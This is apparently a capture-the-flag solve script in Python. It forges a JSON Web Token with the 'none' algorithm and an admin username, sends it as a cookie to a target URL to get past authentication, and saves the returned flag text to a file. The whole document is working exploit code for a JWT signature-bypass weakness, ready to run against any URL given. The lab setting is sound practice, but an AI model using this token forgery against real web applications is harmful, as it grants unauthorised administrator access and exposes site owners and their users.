#!/usr/bin/python3
# Author: Hack.You

import requests
from termcolor import colored
import json
import base64
import sys
import hmac
import hashlib
import os
from bs4 import *

print(colored('''
  ____      _     _____ _             
 / ___| ___| |_  |  ___| | __ _  __ _ 
| |  _ / _ \ __| | |_  | |/ _` |/ _` |
| |_| |  __/ |_  |  _| | | (_| | (_| |
 \____|\___|\__| |_|   |_|\__,_|\__, |
                                |___/ 
''' , 'red'))

if len(sys.argv) < 2:
    print('\033[91m' + '@Author: Hack.You' + '\033[0m')
    print(colored(f"Usage: python3 {sys.argv[0]} http://127.0.0.1/", 'blue'))
    sys.exit(0)

sign_key = 'pwned' # I'm just using random sign key lool

header = json.dumps({
    "alg":"none",
    "typ":"JWT"
}).encode()

payload = json.dumps({
    "username": "admin",
}).encode()

header_ = base64.urlsafe_b64encode(header).decode().rstrip('=')
payload_ = base64.urlsafe_b64encode(payload).decode().rstrip('=')

# sign a new signature (hmac needs key,msg & digestmod)
signature = hmac.new(
    key=sign_key.encode(),
    msg=f'{header_}.{payload_}'.encode(),
    digestmod = hashlib.sha256
).digest()

# jwt token header.payload.signature
sign = f'{header_}.{payload_}.{base64.urlsafe_b64encode(signature).decode()}'

url = sys.argv[1]
# proxy = {'http':'http://127.0.0.1:8080'}
headers = {
    'Cookie': f'jwt={sign.rstrip("=")}'
}

req = requests.get(f'{url}', headers=headers)
req = requests.get(f'{url}', headers=headers)
text = BeautifulSoup(req.content, 'html.parser')
h3_text = text.find('h3').text
with open('flag.txt', 'w') as f:
    f.write(h3_text)

os.system('cat flag.txt')
